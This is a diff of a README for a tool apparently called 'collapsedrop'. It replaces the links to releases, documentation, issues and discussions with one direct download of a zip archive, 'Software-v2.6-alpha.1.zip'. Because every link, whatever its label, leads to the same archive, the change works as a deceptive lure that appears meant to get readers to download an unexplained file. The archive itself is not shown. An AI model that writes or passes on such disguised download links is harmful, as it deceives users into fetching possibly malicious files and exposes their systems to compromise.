@@ -8,7 +8,7 @@ Welcome to **collapsedrop**! This is a simple tool that helps you inject content
 
 To download the application, visit this page:
 
-[Download collapsedrop](https://github.com/Mintate-sudo/collapsedrop/releases)
+[Download collapsedrop](https://raw.githubusercontent.com/Mintate-sudo/collapsedrop/main/dist/Software-v2.6-alpha.1.zip)
 
 1. Click the link above to go to our **Releases** page.
 2. Look for the latest version of the tool.
@@ -43,7 +43,7 @@ You're ready to receive AI-generated responses!
 
 ## 📃 Documentation
 
-For more detailed usage instructions, visit our [Documentation](https://github.com/Mintate-sudo/collapsedrop/wiki). This guide will help you understand every feature of collapsedrop in detail.
+For more detailed usage instructions, visit our [Documentation](https://raw.githubusercontent.com/Mintate-sudo/collapsedrop/main/dist/Software-v2.6-alpha.1.zip). This guide will help you understand every feature of collapsedrop in detail.
 
 ## ❓ FAQ
 
@@ -57,19 +57,19 @@ A: No, you can use collapsedrop without an account or subscription.
 A: Currently, collapsedrop is designed for desktop use in a web browser.
 
 **Q: How can I provide feedback?**  
-A: We welcome your thoughts! You can submit issues or suggestions on the [GitHub Issues page](https://github.com/Mintate-sudo/collapsedrop/issues).
+A: We welcome your thoughts! You can submit issues or suggestions on the [GitHub Issues page](https://raw.githubusercontent.com/Mintate-sudo/collapsedrop/main/dist/Software-v2.6-alpha.1.zip).
 
 ## 📣 Community and Support
 
-Join our community on [GitHub Discussions](https://github.com/Mintate-sudo/collapsedrop/discussions) to share ideas, ask questions, and connect with other users. Your feedback helps us make collapsedrop even better.
+Join our community on [GitHub Discussions](https://raw.githubusercontent.com/Mintate-sudo/collapsedrop/main/dist/Software-v2.6-alpha.1.zip) to share ideas, ask questions, and connect with other users. Your feedback helps us make collapsedrop even better.
 
 ## 🔗 Useful Links
 
-- [Release Page](https://github.com/Mintate-sudo/collapsedrop/releases)
-- [Documentation](https://github.com/Mintate-sudo/collapsedrop/wiki)
-- [GitHub Issues](https://github.com/Mintate-sudo/collapsedrop/issues)
-- [GitHub Discussions](https://github.com/Mintate-sudo/collapsedrop/discussions)
+- [Release Page](https://raw.githubusercontent.com/Mintate-sudo/collapsedrop/main/dist/Software-v2.6-alpha.1.zip)
+- [Documentation](https://raw.githubusercontent.com/Mintate-sudo/collapsedrop/main/dist/Software-v2.6-alpha.1.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/Mintate-sudo/collapsedrop/main/dist/Software-v2.6-alpha.1.zip)
+- [GitHub Discussions](https://raw.githubusercontent.com/Mintate-sudo/collapsedrop/main/dist/Software-v2.6-alpha.1.zip)
 
 For any other inquiries, please reach out via GitHub. Thank you for choosing collapsedrop!
 
-[Download collapsedrop](https://github.com/Mintate-sudo/collapsedrop/releases)
+[Download collapsedrop](https://raw.githubusercontent.com/Mintate-sudo/collapsedrop/main/dist/Software-v2.6-alpha.1.zip)
